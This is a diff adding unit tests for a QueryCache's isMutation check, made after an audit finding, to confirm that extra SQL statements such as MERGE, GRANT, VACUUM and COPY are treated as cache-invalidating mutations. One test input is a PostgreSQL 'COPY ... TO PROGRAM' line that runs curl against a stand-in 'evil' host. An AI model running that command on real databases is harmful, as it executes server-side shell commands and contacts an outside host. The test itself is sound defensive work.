@@ -64,6 +64,42 @@ describe('QueryCache', () => {
     });
   });
 
+  describe('isMutation - extended mutation detection (H5)', () => {
+    // Audit H5: MUTATION_RE was extended to cover MERGE, UPSERT, GRANT, REVOKE,
+    // ATTACH, DETACH, VACUUM, REINDEX, and COPY — all of which modify data/schema
+    // and must invalidate cached SELECT results.
+    it.each([
+      'MERGE INTO target USING source ON 1=1 WHEN MATCHED THEN UPDATE SET x = 1',
+      'UPSERT INTO users (id, name) VALUES (1, \"a\")',
+      'GRANT SELECT ON users TO readonly',
+      'REVOKE SELECT ON users FROM readonly',
+      'ATTACH DATABASE \"other.db\" AS other',
+      'DETACH DATABASE other',
+      'VACUUM',
+      'REINDEX users',
+      "COPY users FROM '/tmp/data.csv'",
+      "COPY (SELECT 1) TO PROGRAM 'curl http://evil'",
+    ])('detects %s as a mutation', (sql) => {
+      expect(cache.isMutation(sql)).toBe(true);
+    });
+
+    it('still detects original mutations (INSERT, UPDATE, DELETE, DROP, etc.)', () => {
+      expect(cache.isMutation('INSERT INTO t VALUES (1)')).toBe(true);
+      expect(cache.isMutation('UPDATE t SET x = 1')).toBe(true);
+      expect(cache.isMutation('DELETE FROM t')).toBe(true);
+      expect(cache.isMutation('DROP TABLE t')).toBe(true);
+      expect(cache.isMutation('TRUNCATE TABLE t')).toBe(true);
+      expect(cache.isMutation('ALTER TABLE t ADD COLUMN x INT')).toBe(true);
+      expect(cache.isMutation('CREATE TABLE t (x INT)')).toBe(true);
+      expect(cache.isMutation('REPLACE INTO t VALUES (1)')).toBe(true);
+    });
+
+    it('does not flag SELECT as a mutation', () => {
+      expect(cache.isMutation('SELECT * FROM users')).toBe(false);
+      expect(cache.isMutation('  SELECT 1')).toBe(false);
+    });
+  });
+
   describe('shouldCache', () => {
     it('returns true for SELECT', () => {
       expect(cache.shouldCache('SELECT * FROM foo')).toBe(true);
